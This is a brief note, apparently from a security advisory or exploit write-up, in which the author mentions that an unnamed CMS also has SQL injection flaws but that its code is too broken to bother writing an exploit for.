[+] Short note:
This CMS also has other vulnerabilities, such as SQL Injections, but,
unfortuntaly, who wrote this CMS was a bit an idiot, because declared
functions called, for example, 'try', forgot some ';' or '}' somewhere...
Call me lazy or what you want but I don't want to spend time fixing a CMS
just for code an exploit ...
